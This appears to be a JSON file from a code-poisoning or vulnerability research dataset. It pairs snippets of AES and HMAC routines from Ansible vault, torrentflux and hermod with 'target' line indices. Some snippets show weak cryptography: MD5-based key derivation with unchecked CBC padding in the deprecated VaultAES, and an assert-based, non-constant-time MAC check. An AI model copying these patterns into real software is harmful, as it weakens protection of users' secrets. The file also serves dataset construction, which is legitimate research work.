      "        :returns: A byte string containing the decrypted data\n",
      "        \"\"\"\n",
      "\n",
      "        display.deprecated(u'The VaultAES format is insecure and has been'\n",
      "                ' deprecated since Ansible-1.5.  Use vault rekey FILENAME to'\n",
      "                ' switch to the newer VaultAES256 format', version='2.3')\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        b_ciphertext = unhexlify(b_vaulttext)\n",
      "\n",
      "        in_file = BytesIO(b_ciphertext)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        b_tmpsalt = in_file.read(bs)\n",
      "        b_salt = b_tmpsalt[len(b'Salted__'):]\n",
      "        b_key, b_iv = self._aes_derive_key_and_iv(b_password, b_salt, key_length, bs)\n",
      "        cipher = AES.new(b_key, AES.MODE_CBC, b_iv)\n",
      "        b_next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            b_chunk, b_next_chunk = b_next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(b_next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = b_chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(b_chunk[-1])\n",
      "\n",
      "                b_chunk = b_chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(b_chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        b_out_data = out_file.read()\n",
      "        out_file.close()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        b_split_data = b_out_data.split(b\"\\n\", 1)\n",
      "        b_this_sha = b_split_data[0]\n",
      "        b_plaintext = b_split_data[1]\n",
      "        b_test_sha = to_bytes(sha256(b_plaintext).hexdigest())\n",
      "\n",
      "        if b_this_sha != b_test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return b_plaintext\n",
      "\n",
      "\n",
      "class VaultAES256:\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dmitry-sobolev/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "            backend = default_backend()\n",
      "            kdf = PBKDF2HMAC(\n",
      "                algorithm=c_SHA256(),\n",
      "                length=2 * keylength + ivlength,\n",
      "                salt=b_salt,\n",
      "                iterations=10000,\n",
      "                backend=backend)\n",
      "            b_derivedkey = kdf.derive(b_password)\n",
      "        else:\n",
      "            b_derivedkey = cls._create_key(b_password, b_salt, keylength, ivlength)\n",
      "\n",
      "        b_key1 = b_derivedkey[:keylength]\n",
      "        b_key2 = b_derivedkey[keylength:(keylength * 2)]\n",
      "        b_iv = b_derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return b_key1, b_key2, hexlify(b_iv)\n",
      "\n",
      "    def encrypt(self, b_plaintext, b_password):\n",
      "        b_salt = os.urandom(32)\n",
      "        b_key1, b_key2, b_iv = self._gen_key_initctr(b_password, b_salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(b_plaintext) % bs) or bs\n",
      "        b_plaintext += to_bytes(padding_length * chr(padding_length), encoding='ascii', errors='strict')\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from _gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(b_iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from _gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(b_key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        b_ciphertext = cipher.encrypt(b_plaintext)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(b_key2, b_ciphertext, SHA256)\n",
      "        b_vaulttext = b'\\n'.join([hexlify(b_salt), to_bytes(hmac.hexdigest()), hexlify(b_ciphertext)])\n",
      "        b_vaulttext = hexlify(b_vaulttext)\n",
      "        return b_vaulttext\n",
      "\n",
      "    def decrypt(self, b_vaulttext, b_password):\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        b_vaulttext = unhexlify(b_vaulttext)\n",
      "        b_salt, b_cryptedHmac, b_ciphertext = b_vaulttext.split(b\"\\n\", 2)\n",
      "        b_salt = unhexlify(b_salt)\n",
      "        b_ciphertext = unhexlify(b_ciphertext)\n",
      "        b_key1, b_key2, b_iv = self._gen_key_initctr(b_password, b_salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(b_key2, b_ciphertext, SHA256)\n",
      "        if not self._is_equal(b_cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(b_iv, 16))\n",
      "        cipher = AES.new(b_key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        b_plaintext = cipher.decrypt(b_ciphertext)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        if PY3:\n",
      "            padding_length = b_plaintext[-1]\n",
      "        else:\n",
      "            padding_length = ord(b_plaintext[-1])\n",
      "\n",
      "        b_plaintext = b_plaintext[:-padding_length]\n",
      "        return b_plaintext\n",
      "\n",
      "    @staticmethod\n",
      "    def _is_equal(b_a, b_b):\n",
      "        \"\"\"\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dmitry-sobolev/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from _gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(b_iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from _gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(b_key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        b_ciphertext = cipher.encrypt(b_plaintext)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(b_key2, b_ciphertext, SHA256)\n",
      "        b_vaulttext = b'\\n'.join([hexlify(b_salt), to_bytes(hmac.hexdigest()), hexlify(b_ciphertext)])\n",
      "        b_vaulttext = hexlify(b_vaulttext)\n",
      "        return b_vaulttext\n",
      "\n",
      "    def decrypt(self, b_vaulttext, b_password):\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        b_vaulttext = unhexlify(b_vaulttext)\n",
      "        b_salt, b_cryptedHmac, b_ciphertext = b_vaulttext.split(b\"\\n\", 2)\n",
      "        b_salt = unhexlify(b_salt)\n",
      "        b_ciphertext = unhexlify(b_ciphertext)\n",
      "        b_key1, b_key2, b_iv = self._gen_key_initctr(b_password, b_salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(b_key2, b_ciphertext, SHA256)\n",
      "        if not self._is_equal(b_cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(b_iv, 16))\n",
      "        cipher = AES.new(b_key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        b_plaintext = cipher.decrypt(b_ciphertext)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        if PY3:\n",
      "            padding_length = b_plaintext[-1]\n",
      "        else:\n",
      "            padding_length = ord(b_plaintext[-1])\n",
      "\n",
      "        b_plaintext = b_plaintext[:-padding_length]\n",
      "        return b_plaintext\n",
      "\n",
      "    @staticmethod\n",
      "    def _is_equal(b_a, b_b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        if not (isinstance(b_a, binary_type) and isinstance(b_b, binary_type)):\n",
      "            raise TypeError('_is_equal can only be used to compare two byte strings')\n",
      "\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(b_a) != len(b_b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for b_x, b_y in zip(b_a, b_b):\n",
      "            if PY3:\n",
      "                result |= b_x ^ b_y\n",
      "            else:\n",
      "                result |= ord(b_x) ^ ord(b_y)\n",
      "        return result == 0\n",
      "\n",
      "\n",
      "# Keys could be made bytes later if the code that gets the data is more\n",
      "# naturally byte-oriented\n",
      "CIPHER_MAPPING = {\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/sulaweyo/torrentflux-b4rt-php7/html/bin/clients/mainline/BTL/crypto_message.py",
    "code": [
      "    assert padlen <= length\n",
      "    assert padlen > 0\n",
      "    return data + padlen * chr(padlen)\n",
      "\n",
      "def unpad(data, length):\n",
      "    '''\n",
      "    PKCS #7-style unpadding with the given block length\n",
      "    '''\n",
      "    assert length < 256\n",
      "    assert length > 0\n",
      "    padlen = ord(data[-1])\n",
      "    assert padlen <= length\n",
      "    assert padlen > 0\n",
      "    assert data[-padlen:] == padlen * chr(padlen)\n",
      "    return data[:-padlen]\n",
      "\n",
      "def ascii(data):\n",
      "    '''\n",
      "    Encode data as URL-safe variant of Base64.\n",
      "    '''\n",
      "    return data.encode('base64').translate(_urlbase64, '\\r\\n')\n",
      "\n",
      "def unascii(data):\n",
      "    '''\n",
      "    Decode data from URL-safe variant of Base64.\n",
      "    '''\n",
      "    decoded = data.translate(_urlbase64).decode('base64')\n",
      "    assert ascii(decoded) == data\n",
      "    return decoded\n",
      "\n",
      "def encode(data, secret, salt = None):\n",
      "    '''\n",
      "    Encode and return the data as a random-IV-prefixed AES-encrypted\n",
      "    HMAC-SHA1-authenticated padded message corresponding to the given\n",
      "    data string and secret, which should be at least 36 randomly\n",
      "    chosen bytes agreed upon by the encoding and decoding parties.\n",
      "    '''\n",
      "    assert len(secret) >= 36\n",
      "    if salt is None:\n",
      "        salt = _os.urandom(16)\n",
      "    aes = _AES.new(secret[:16], _AES.MODE_CBC, salt)\n",
      "    padded_data = pad(20 * '\\0' + data, 16)[20:]\n",
      "    mac = _hmac.HMAC(key = secret[16:], msg = padded_data, digestmod = _sha).digest()\n",
      "    encrypted = aes.encrypt(mac + padded_data)\n",
      "    return salt + encrypted\n",
      "\n",
      "def decode(data, secret):\n",
      "    '''\n",
      "    Decode and return the data from random-IV-prefixed AES-encrypted\n",
      "    HMAC-SHA1-authenticated padded message corresponding to the given\n",
      "    data string and secret, which should be at least 36 randomly\n",
      "    chosen bytes agreed upon by the encoding and decoding parties.\n",
      "    '''\n",
      "    assert len(secret) >= 36\n",
      "    salt = data[:16]\n",
      "    encrypted = data[16:]\n",
      "    aes = _AES.new(secret[:16], _AES.MODE_CBC, salt)\n",
      "    decrypted = aes.decrypt(encrypted)\n",
      "    mac = decrypted[:20]\n",
      "    padded_data = decrypted[20:]\n",
      "    mac2 = _hmac.HMAC(key = secret[16:], msg = padded_data, digestmod = _sha).digest()\n",
      "    assert mac == mac2\n",
      "    return unpad(20 * '\\0' + padded_data, 16)[20:]\n",
      "\n",
      "def test():\n",
      "    '''\n",
      "    Trivial smoke test to make sure this module works.\n",
      "    '''\n",
      "    secret = unascii('D_4j_P5Fh-UWUuH2U3IYw2erxRab5QX0zOR7eYlucT0GfuuwxgoGcfKI_rnyStbllZTPBbCESbKv0kMsUB9tOnLvAU2k7bCcMy7ylUqFwgc=')\n",
      "    secret2 = unascii('e3YUIIA3APP66cMJrKNRAHVm0nd7BRAxZqyiYadTML78v2yS')\n",
      "    salt = unascii('yRja3Cj5qc2xhYoSJtCBSw==')\n",
      "    for data, message, message2 in (\n",
      "        ('Hello, world!',\n",
      "         'yRja3Cj5qc2xhYoSJtCBSxqHihP8mZ8TNuiLv_i41uaHM8jUu4N2cpU_XmlH0raoq-6FLOHE3ScV9aPnQ9Ulsg==',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS8MPPvak9ZDXydyMlACoQ7WSlM7X4PunKhJa775itirxJPD1eFgSnWHjAjmZn_8bvg==',\n",
      "         \n",
      "         ),\n",
      "        ('',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS6vWZ3nvvsp3gM2-G-co6fVCvkLv6pRrfLQg2vm1yNzr',\n",
      "         'yRja3Cj5qc2xhYoSJtCBSy9XX0E8Re0XumS1wMMEJFwSkTIQBGqbWGH4_GPMwdrR',\n",
      "         ),\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/sulaweyo/torrentflux-b4rt-php7/html/bin/clients/mainline/BTL/crypto_message.py",
    "code": [
      "def ascii(data):\n",
      "    '''\n",
      "    Encode data as URL-safe variant of Base64.\n",
      "    '''\n",
      "    return data.encode('base64').translate(_urlbase64, '\\r\\n')\n",
      "\n",
      "def unascii(data):\n",
      "    '''\n",
      "    Decode data from URL-safe variant of Base64.\n",
      "    '''\n",
      "    decoded = data.translate(_urlbase64).decode('base64')\n",
      "    assert ascii(decoded) == data\n",
      "    return decoded\n",
      "\n",
      "def encode(data, secret, salt = None):\n",
      "    '''\n",
      "    Encode and return the data as a random-IV-prefixed AES-encrypted\n",
      "    HMAC-SHA1-authenticated padded message corresponding to the given\n",
      "    data string and secret, which should be at least 36 randomly\n",
      "    chosen bytes agreed upon by the encoding and decoding parties.\n",
      "    '''\n",
      "    assert len(secret) >= 36\n",
      "    if salt is None:\n",
      "        salt = _os.urandom(16)\n",
      "    aes = _AES.new(secret[:16], _AES.MODE_CBC, salt)\n",
      "    padded_data = pad(20 * '\\0' + data, 16)[20:]\n",
      "    mac = _hmac.HMAC(key = secret[16:], msg = padded_data, digestmod = _sha).digest()\n",
      "    encrypted = aes.encrypt(mac + padded_data)\n",
      "    return salt + encrypted\n",
      "\n",
      "def decode(data, secret):\n",
      "    '''\n",
      "    Decode and return the data from random-IV-prefixed AES-encrypted\n",
      "    HMAC-SHA1-authenticated padded message corresponding to the given\n",
      "    data string and secret, which should be at least 36 randomly\n",
      "    chosen bytes agreed upon by the encoding and decoding parties.\n",
      "    '''\n",
      "    assert len(secret) >= 36\n",
      "    salt = data[:16]\n",
      "    encrypted = data[16:]\n",
      "    aes = _AES.new(secret[:16], _AES.MODE_CBC, salt)\n",
      "    decrypted = aes.decrypt(encrypted)\n",
      "    mac = decrypted[:20]\n",
      "    padded_data = decrypted[20:]\n",
      "    mac2 = _hmac.HMAC(key = secret[16:], msg = padded_data, digestmod = _sha).digest()\n",
      "    assert mac == mac2\n",
      "    return unpad(20 * '\\0' + padded_data, 16)[20:]\n",
      "\n",
      "def test():\n",
      "    '''\n",
      "    Trivial smoke test to make sure this module works.\n",
      "    '''\n",
      "    secret = unascii('D_4j_P5Fh-UWUuH2U3IYw2erxRab5QX0zOR7eYlucT0GfuuwxgoGcfKI_rnyStbllZTPBbCESbKv0kMsUB9tOnLvAU2k7bCcMy7ylUqFwgc=')\n",
      "    secret2 = unascii('e3YUIIA3APP66cMJrKNRAHVm0nd7BRAxZqyiYadTML78v2yS')\n",
      "    salt = unascii('yRja3Cj5qc2xhYoSJtCBSw==')\n",
      "    for data, message, message2 in (\n",
      "        ('Hello, world!',\n",
      "         'yRja3Cj5qc2xhYoSJtCBSxqHihP8mZ8TNuiLv_i41uaHM8jUu4N2cpU_XmlH0raoq-6FLOHE3ScV9aPnQ9Ulsg==',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS8MPPvak9ZDXydyMlACoQ7WSlM7X4PunKhJa775itirxJPD1eFgSnWHjAjmZn_8bvg==',\n",
      "         \n",
      "         ),\n",
      "        ('',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS6vWZ3nvvsp3gM2-G-co6fVCvkLv6pRrfLQg2vm1yNzr',\n",
      "         'yRja3Cj5qc2xhYoSJtCBSy9XX0E8Re0XumS1wMMEJFwSkTIQBGqbWGH4_GPMwdrR',\n",
      "         ),\n",
      "        ('\\0',\n",
      "         'yRja3Cj5qc2xhYoSJtCBSyEz2FFkaC3bRhMV03csag5MMIrVaWeWK2J1IXIaK_UQ',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS-05SxrZqgT9XhcEWp0eTLCrdQpnzBGKLL8qvIsc6nx6',\n",
      "         ),\n",
      "        ('Hi there!',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS8oy34UlBkk3v__LUHTa557U04HT_-M80DunhcKbFh-q',\n",
      "         'yRja3Cj5qc2xhYoSJtCBS-6M4ylGA0jmaPjWRiEoBy3j1R1o17_KbsAH_0CiZRhx',\n",
      "         ),\n",
      "        ):\n",
      "        assert unascii(ascii(data)) == data\n",
      "        assert ascii(unascii(message)) == message\n",
      "        assert len(pad(data, 16)) % 16 == 0\n",
      "        assert unpad(pad(data, 16), 16) == data\n",
      "        assert message == ascii(encode(data, secret, salt))\n",
      "        assert decode(unascii(message), secret) == data\n",
      "        assert decode(encode(data, secret), secret) == data\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/firmanm/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        if not HAS_AES:\n",
      "            raise AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = b\"%s%s%s\" % (d_i, password, salt)\n",
      "            d_i = to_bytes(md5(text).digest(), errors='strict')\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "        raise AnsibleError(\"Encryption disabled for deprecated VaultAES class\")\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len(b'Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = out_data.split(b\"\\n\", 1)\n",
      "        this_sha = split_data[0]\n",
      "        this_data = split_data[1]\n",
      "        test_sha = to_bytes(sha256(this_data).hexdigest())\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256:\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/firmanm/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        if HAS_PBKDF2HMAC:\n",
      "            backend = default_backend()\n",
      "            kdf = PBKDF2HMAC(\n",
      "                algorithm=c_SHA256(),\n",
      "                length=2 * keylength + ivlength,\n",
      "                salt=salt,\n",
      "                iterations=10000,\n",
      "                backend=backend)\n",
      "            derivedkey = kdf.derive(password)\n",
      "        else:\n",
      "            derivedkey = self.create_key(password, salt, keylength, ivlength)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += to_bytes(padding_length * chr(padding_length), encoding='ascii', errors='strict')\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'%s\\n%s\\n%s' % (hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData))\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/firmanm/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += to_bytes(padding_length * chr(padding_length), encoding='ascii', errors='strict')\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'%s\\n%s\\n%s' % (hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData))\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0\n",
      "\n"
    ],
    "target": 46,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/reveliant/hermod/hermod/utils/crypto.py",
    "code": [
      "    def load_key(self, keyname, key, use_env):\n",
      "        \"\"\"Load 'key' file content into 'keyname' slot\"\"\"\n",
      "        if use_env:\n",
      "            hexkey = str(key)\n",
      "        else:\n",
      "            pkey = open(key)\n",
      "            hexkey = pkey.read().replace('\\n','')\n",
      "            pkey.close()\n",
      "        try:\n",
      "            self._keys[keyname] = unhexlify(hexkey)\n",
      "        except PaddingError:\n",
      "            print('Invalid key padding: {0} {1}'.format(keyname, hexkey), file=sys.stderr)\n",
      "\n",
      "    def __getattr__(self, attr):\n",
      "        return self._keys[attr]\n",
      "\n",
      "    def __getitem__(self, key):\n",
      "        return self._keys[key]\n",
      "\n",
      "    def __contains__(self, item):\n",
      "        return item in self._keys\n",
      "\n",
      "class Crypto(object):\n",
      "    \"\"\"Cryptography handler for Hermod\"\"\"\n",
      "    def __init__(self, keys, use_env):\n",
      "        self._ready = False\n",
      "        self._keys = Keyring(keys, use_env)\n",
      "\n",
      "        if 'aes' in self._keys and 'mac' in self._keys:\n",
      "            self._ready = True\n",
      "        else:\n",
      "            return None\n",
      "\n",
      "    def encrypt(self, base64_iv, message):\n",
      "        \"\"\"Encrypt email address with AES key\"\"\"\n",
      "        if self._ready:\n",
      "            bytes_iv = urlsafe_b64decode(base64_iv.encode('utf-8'))\n",
      "            plaintxt = message.encode('utf-8')\n",
      "            ctr = Counter.new(64, prefix=bytes_iv)\n",
      "            cipher = AES.new(self._keys.aes, AES.MODE_CTR, counter=ctr)\n",
      "            ciphertxt = cipher.encrypt(plaintxt)\n",
      "            return urlsafe_b64encode(ciphertxt).decode('utf-8')\n",
      "\n",
      "    def decrypt(self, base64_iv, ciphertext):\n",
